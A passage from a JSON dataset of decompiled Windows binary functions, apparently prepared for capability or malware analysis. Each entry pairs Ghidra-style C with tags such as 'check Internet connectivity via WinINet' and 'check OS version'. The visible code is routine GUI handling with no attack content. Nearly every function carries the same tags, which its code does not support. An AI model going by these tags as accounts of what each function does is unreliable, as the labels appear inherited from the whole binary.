        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043e304(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uStack52 = 0x43e319;\n    iVar1 = (**(*param_2 + 0x38))();\n    if (var_1h == '\\0') {\n        var_20h = param_2[0x11];\n        var_1ch = param_2[0x12];\n        var_18h = param_2[0x13];\n        var_14h = param_2[0x14];\n    }\n    else {\n        var_20h = param_2[0x17];\n        var_1ch = param_2[0x18];\n        var_18h = param_2[0x19];\n        var_14h = param_2[0x1a];\n    }\n    uStack52 = 0x43e340;\n    uVar2 = sub.user32.dll_GetDesktopWindow();\n    uStack52 = 0x402;\n    uStack56 = 0;\n    puStack64 = 0x43e353;\n    uStack60 = uVar2;\n    uVar3 = sub.user32.dll_GetDCEx();\n    uStack68 = 0x43e41f;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &fcn.0043e304::var_1h + 1;\n    uVar4 = fcn.00426938();\n    uVar5 = sub.gdi32.dll_SelectObject(uVar3, uVar4);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h + iVar1, var_1ch, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_18h - iVar1, var_1ch + iVar1, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_14h - iVar1, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_1ch, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    uVar4 = uVar3;\n    sub.gdi32.dll_SelectObject(uVar3, uVar5);\n    *in_FS_OFFSET = uVar4;\n    sub.user32.dll_ReleaseDC(uVar2, uVar3, 0x43e426);\n    return;\n}\n",
        "token_count": 788
    },
    "0043e458": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e458(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uchar auStack28 [5];\n    uint32_t uStack23;\n    \n    cVar1 = fcn.004039b8();\n    if ((*0x485acc != '\\0') && (cVar1 == '\\0')) {\n        fcn.004039dc();\n    }\n    fcn.0043d38c();\n    if (*(param_2 + 4) < 3) {\n        auStack28[0] = 1;\n        if (cVar1 == '\\0') {\n            uVar2 = uStack23 & 0xffffff00 | *(param_2 + 4);\n            fcn.00403a28(auStack28, uVar2, uStack23);\n        }\n        else {\n            uVar2 = uStack23 & 0xffffff00 | *(param_2 + 4);\n            fcn.00403a28(auStack28, uVar2, uStack23);\n        }\n        *(param_2 + 0xc) = uVar2 & 0xff;\n    }\n    else if (*(param_2 + 4) == 3) {\n        if (cVar1 == '\\0') {\n            fcn.00403a28(uStack23);\n        }\n        else {\n            fcn.00403a28(uStack23);\n        }\n    }\n    return;\n}\n",
        "token_count": 324
    },
    "0043e548": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043e548(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint *arg_8h_00;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    if ((in_EDX == 0) || (in_EDX == -1)) {\n        iVar3 = *(in_EAX + 0xa0);\n        if (((iVar3 == 0) || (*(iVar3 + 0x1a7) == '\\0')) || (*(iVar3 + 0x17c) == 0)) {\n            fcn.0041b058();\n            var_1ch = var_24h;\n            var_18h = var_20h;\n            if (*(in_EAX + 0x30) != 0) {\n                fcn.0043d360();\n                var_1ch = var_24h;\n                var_18h = var_20h;\n            }\n        }\n        else {\n            (**(**(iVar3 + 0x17c) + 0x14))();\n            var_34h = 2;\n            fcn.0044407c();\n            sub.user32.dll_MapWindowPoints();\n        }\n        uVar1 = fcn.0043d7d8();\n        arg_8h_00 = &fcn.0043e548::var_34h;\n        uStack80 = 0x43e5f9;\n        fcn.0043d7ec();\n        uStack80 = 0x43e606;\n        fcn.0041b0a8(arg_8h_00, uVar1);\n        var_1ch = var_34h;\n        var_18h = uStack52;\n        uStack24 = uStack48;\n        uStack20 = uStack44;\n        uStack80 = 0x43e61a;\n        uVar2 = fcn.0043e728();\n        var_5h = uVar2;\n        goto code_r0x0043e71a;\n    }\n    uVar1 = fcn.0043ea30();\n    if (*(in_EAX + 0xa0) == 0) {\ncode_r0x0043e64d:\n        uVar2 = CONCAT31(uVar1 >> 8, 1);\n    }\n    else {\n        uVar1 = fcn.00403a28();\n        if (uVar1 != '\\0') goto code_r0x0043e64d;\n        uVar2 = 0;\n    }\n    var_5h = uVar2;\n    if (var_5h != 0) {\n        var_ch = fcn.0043af48();\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        if (*(in_EAX + 0xa0) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.0044407c();\n        }\n        fcn.0043d1e8();\n        if (iVar3 != 0) {\n            sub.user32.dll_MapWindowPoints(iVar3, 0, &fcn.0043e548::var_1ch, 2);\n        }\n        *(var_ch + 4) = in_EDX;\n        *(var_ch + 0x54) = arg_8h;\n        *(var_ch + 0x58) = var_4h;\n        *(var_ch + 0x44) = var_1ch;\n        *(var_ch + 0x48) = var_18h;\n        *(var_ch + 0x4c) = uStack24;\n        *(var_ch + 0x50) = uStack20;\n        uVar1 = fcn.0044407c(&fcn.0043e548::var_1ch, 1);\n        sub.user32.dll_MapWindowPoints(0, uVar1);\n        fcn.00403a28();\n        *in_FS_OFFSET = var_18h;\n        uVar2 = fcn.00403820(0x43e71a);\n        return uVar2;\n    }\ncode_r0x0043e71a:\n    return uVar2 & 0xffffff00 | var_5h;\n}\n",
        "token_count": 1046
    },
    "0043e7cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043e7cc(uint param_1)\n\n{\n    uint32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = CONCAT31(param_1 >> 8, 1);\n    if (*(in_EAX + 0xc2) != 0) {\n        in_EAX = (**(in_EAX + 0xc0))(&uStack8, param_1);\n    }\n    return CONCAT44(uStack8, in_EAX & 0xffffff00 | uStack8 & 0xff);\n}\n",
        "token_count": 120
    },
    "0043e898": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e898(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xca) != 0) {\n        (**(in_EAX + 200))(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0043e928": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e928(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piStack28;\n    int32_t *piStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    piStack28 = *(in_EAX[0x1d] + 0x14);\n    if (piStack28 == NULL) {\n        piStack28 = NULL;\n    }\n    piStack24 = *(in_EAX[0x1d] + 0x10);\n    if (piStack24 == NULL) {\n        piStack24 = NULL;\n    }\n    iStack20 = *(in_EAX[0x1d] + 0xc);\n    if (iStack20 == 0) {\n        iStack20 = 0;\n    }\n    iStack16 = *(in_EAX[0x1d] + 8);\n    if (iStack16 == 0) {\n        iStack16 = 0;\n    }\n    (**(*in_EAX + 0x38))();\n    if ((piStack28 < 1) || (*param_2 <= piStack28)) {\n        if ((0 < &iStack16) && (*param_2 < &iStack16)) {\n            *param_2 = &iStack16;\n        }\n    }\n    else {\n        *param_2 = piStack28;\n    }\n    if ((piStack24 < 1) || (*param_1 <= piStack24)) {\n        if ((0 < &iStack20) && (*param_1 < &iStack20)) {\n            *param_1 = &iStack20;\n        }\n    }\n    else {\n        *param_1 = piStack24;\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "0043ea30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0043ea30(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = (**(*in_EAX + 0x54))();\n    if (uVar2 != '\\0') {\n        in_EAX[0x2b] = in_EAX[0x13];\n        in_EAX[0x2a] = in_EAX[0x12];\n        return in_EAX[0x12];\n    }\n    if (in_EAX[0x28] != 0) {\n        if ((*(in_EAX + 0x27) == '\\x02') || (*(in_EAX[0x28] + 0x5b) - 1U < 2)) {\n            uVar2 = in_EAX[0x13];\n            in_EAX[0x2d] = uVar2;\n        }\n        else if ((*(in_EAX + 0x27) == '\\x01') ||\n                (cVar1 = *(in_EAX[0x28] + 0x5b),  uVar2 = in_EAX[0x28] & 0xffffff00U | cVar1 - 5,  cVar1 - 3U < 2)) {\n            uVar2 = in_EAX[0x12];\n            in_EAX[0x2c] = uVar2;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 327
    },
    "0043eac8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043eac8(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint lpKeyState;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    if (((((*(in_EAX + 7) & 0x10) != 0) && (var_14h = fcn.004544bc(),  var_14h != NULL)) && (var_14h[0x94] != 0)) &&\n       (cVar2 = (**(*var_14h[0x94] + 0x24))(),  cVar2 != '\\0')) {\n        return;\n    }\n    if ((*param_2 < 0x100) || (0x108 < *param_2)) {\n        uVar1 = *param_2;\n        if ((uVar1 < 0x200) || (0x20a < uVar1)) {\n            if (uVar1 == 0xb00b) {\n                fcn.0043d3e8(param_2[2]);\n            }\n        }\n        else {\n            if (((*(in_EAX + 0x14) & 0x80) == 0) && (((uVar1 == 0x203 || (uVar1 == 0x206)) || (uVar1 == 0x209)))) {\n                *param_2 = *param_2 - 2;\n            }\n            uVar1 = *param_2;\n            if (uVar1 == 0x200) {\n                fcn.0045de2c();\n            }\n            else {\n                if (uVar1 != 0x201) {\n                    if (uVar1 == 0x202) {\n                        *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfffe;\n                        goto code_r0x0043ec4a;\n                    }\n                    if (uVar1 != 0x203) {\n                        if (((*(*0x485aa8 + 0x20) != '\\0') && (*(*0x485aa8 + 0x1c) != 0)) &&\n                           (*param_2 == *(*0x485aa8 + 0x1c))) {\n                            sub.user32.dll_GetKeyboardState(&lpKeyState);\n                            var_10h = *param_2;\n                            var_ch._0_1_ = fcn.00454400();\n                            var_ch._2_2_ = *(param_2 + 1);\n                            var_8h = param_2[2];\n                            fcn.00403a28();\n                            return;\n                        }\n                        goto code_r0x0043ec4a;\n                    }\n                }\n                if (*(in_EAX + 0x5d) == '\\x01') {\n                    fcn.00403a28();\n                    return;\n                }\n                *(in_EAX + 0x15) = *(in_EAX + 0x15) | 1;\n            }\n        }\n    }\n    else {\n        var_14h = fcn.004544bc();\n        if ((var_14h != NULL) && (cVar2 = (**(*var_14h + 0xf0))(),  cVar2 != '\\0')) {\n            return;\n        }\n    }\ncode_r0x0043ec4a:\n    (**(*in_EAX + -0x14))();\n    return;\n}\n",
        "token_count": 795
    },
    "0043ed8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043ed8c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x122) != 0) {\n        iVar1 = (**(*in_EAX + 0x3c))();\n        if (iVar1 != 0) {\n            iVar1 = (**(*in_EAX + 0x3c))();\n            if (*(iVar1 + 0x40) != in_EAX[0x48]) {\n                (*in_EAX[0x48])();\n                return;\n            }\n        }\n    }\n    if (((*(in_EAX + 7) & 0x10) == 0) && (in_EAX[0x1b] != 0)) {\n        (**(*in_EAX[0x1b] + 0x18))();\n    }\n    else if (*(in_EAX + 0x122) != 0) {\n        (*in_EAX[0x48])();\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "0043ee18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0043ee18(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xd2) != 0) {\n        (**(in_EAX + 0xd0))(arg_8h, arg_ch, in_ECX);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0043ef94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.0043ef94(uint *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    char cVar4;\n    \n    cVar4 = '\\0';\n    uVar1 = *param_2;\n    uVar2 = *param_1;\n    cVar3 = fcn.0043e868();\n    if (cVar3 != '\\0') {\n        if (((*(in_EAX + 0x5c) == '\\0') || (cVar3 = fcn.0043e7fc(),  cVar3 != '\\0')) ||\n           (cVar3 = fcn.0043e868(),  cVar3 != '\\0')) {\n            cVar4 = '\\x01';\n        }\n        else {\n            cVar4 = '\\0';\n        }\n        if (cVar4 != '\\0') {\n            *param_2 = uVar1;\n            *param_1 = uVar2;\n        }\n    }\n    return cVar4;\n}\n",
        "token_count": 240
    },
    "0043f0d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0043f0d0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "0043f178": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0043f178(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xe2) != 0) {\n        (**(in_EAX + 0xe0))(arg_8h, arg_ch, in_ECX);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0043f4d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f4d8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*(*0x484858 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        (**(*in_EAX + 0x7c))();\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0043f550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043f550(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x56) != '\\0') {\n        fcn.0043d93c();\n        *(in_EAX + 0x56) = 1;\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0043f6c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f6c4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = (**(*in_EAX + 0x54))();\n    if ((cVar1 == '\\0') || (in_EAX[0xc] == 0)) {\n        iVar2 = fcn.0043f5b4();\n        if (iVar2 != 0) {\n            *(*(param_2 + 8) + 4) = iVar2;\n            uVar3 = fcn.0044407c();\n            *(*(param_2 + 8) + 8) = uVar3;\n        }\n    }\n    else {\n        fcn.0043f638(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "0043f724": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043f76b)\n\nvoid __fastcall fcn.0043f724(char param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x43f812;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.004039b8();\n    if (cVar1 != '\\0') {\n        if (param_1 != '\\0') {\n            fcn.0043d848();\n        }\n        fcn.0043d878();\n        if ((param_1 == '\\0') || (cVar1 = (**(*in_EAX + 0x50))(),  cVar1 == '\\x01')) {\n            (**(*in_EAX + 100))();\n        }\n        if ((param_1 == '\\0') || (in_EAX[0x20] == 0)) {\n            fcn.0040461c();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x57) == '\\x01')) {\n            fcn.0043d768();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x122) == 0)) {\n            in_EAX[0x48] = *(param_2 + 0x40);\n            in_EAX[0x49] = *(param_2 + 0x44);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x43f819;\n    uStack32 = 0x43f811;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 438
    },
    "0043fbc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043fbc8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar auStack28 [12];\n    \n    if (*(param_2 + 0xc) == 0) {\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            fcn.004075f8();\n            cVar1 = fcn.0041b0d0();\n            if (cVar1 == '\\0') {\n                fcn.0043d38c();\n                (**(*in_EAX + 0x44))(uStack52, uStack48);\n                iVar2 = sub.user32.dll_PtInRect(auStack28);\n                if (iVar2 == 0) {\n                    (**(*in_EAX + -0x10))();\n                    return;\n                }\n            }\n            fcn.00403a28();\n            *(param_2 + 0xc) = 0;\n            piVar3 = fcn.00403a28();\n            if ((piVar3 != NULL) && (*(piVar3 + 0x61) != '\\0')) {\n                fcn.0043d3b8();\n                piVar3[0x19] = in_EAX;\n                cVar1 = fcn.0041b0d0();\n                if (cVar1 != '\\0') {\n                    fcn.0041b058();\n                    fcn.0043d360();\n                }\n                (**(*piVar3 + 0x40))();\n                *(param_2 + 0xc) = 1;\n            }\n            if (*(param_2 + 0xc) == 0) {\n                (**(*in_EAX + -0x10))();\n            }\n        }\n        else {\n            (**(*in_EAX + -0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "0043fe88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043fe88(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char extraout_DL;\n    \n    piVar1 = fcn.00403bc0();\n    fcn.004229dc();\n    if (*(piVar1 + 0x6a) != '\\0') {\n        *(piVar1 + 0x6a) = 0;\n        fcn.0043b4e0();\n    }\n    fcn.00406298();\n    fcn.00403820();\n    if (piVar1[0xc] != 0) {\n        fcn.00440b34();\n    }\n    if (piVar1[0x60] != 0) {\n        (**(*piVar1 + 0xac))();\n    }\n    iVar2 = fcn.00440d74();\n    while (iVar2 != 0) {\n        piVar3 = fcn.00440d38();\n        fcn.00440ba0();\n        (**(*piVar3 + -4))();\n        iVar2 = fcn.00440d74();\n    }\n    fcn.00403820();\n    if (piVar1[99] != 0) {\n        fcn.00423ed4();\n    }\n    fcn.0043ca20();\n    if ('\\0' < extraout_DL) {\n        fcn.00403ba8();\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "0043ff5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043ff5c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x19c) == 0) {\n        return;\n    }\n    puStack28 = 0x43ff83;\n    fcn.004037f0();\n    uStack32 = 0x440020;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar3 = *(*(in_EAX + 0x19c) + 8);\n    puStack28 = &stack0xfffffffc;\n    fcn.0041c6e4();\n    iVar2 = iVar3;\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar1 = fcn.0041c4c8();\n            if ((-1 < *(iVar1 + 0x1a0)) && (*(iVar1 + 0x1a0) < iVar3)) {\n                fcn.0041c62c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar2 = fcn.0041c4c8();\n            if (iVar2 != 0) {\n                fcn.0044423c();\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x440027;\n    uStack32 = 0x44001f;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 428
    },
    "00440578": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440578(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    (**(**(arg_8h + -0xc) + 8))();\n    if (((*(arg_8h + -0x10) != 0) &&\n        (((in_AL == '\\0' || (*(*(arg_8h + -0x10) + 0x57) != '\\0')) ||\n         (((*(*(arg_8h + -0x10) + 0x1c) & 0x10) != 0 && ((*(*(arg_8h + -0x10) + 0x51) & 4) == 0)))))) &&\n       (in_AL == *(*(arg_8h + -0x10) + 0x5b))) {\n        fcn.0041c358();\n    }\n    var_8h = fcn.00440d74();\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = fcn.00440d38();\n            if (((in_AL == *(iVar2 + 0x5b)) &&\n                ((((in_AL == '\\0' || (*(iVar2 + 0x57) != '\\0')) || (*0x4406e4 == (*0x4406e4 & *(iVar2 + 0x50)))) ||\n                 (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))))) && (iVar2 != *(arg_8h + -0x10))) {\n                for (iVar2 = 0; iVar2 < *(*(arg_8h + -0xc) + 8); iVar2 = iVar2 + 1) {\n                    arg_8h_00 = arg_8h;\n                    fcn.0041c4c8();\n                    cVar1 = fcn.004400ac(arg_8h_00);\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.0041c54c();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    var_8h = *(*(arg_8h + -0xc) + 8);\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = arg_8h;\n            fcn.0041c4c8();\n            fcn.00440138(iVar2);\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 651
    },
    "004406e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004406e8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00440d74();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00440d38();\n            if (*(iVar2 + 0x5b) != '\\0') {\n                return 1;\n            }\n            iVar2 = fcn.00440d38();\n            if (*0x440738 != *(iVar2 + 0x61)) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 168
    },
    "0044073c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
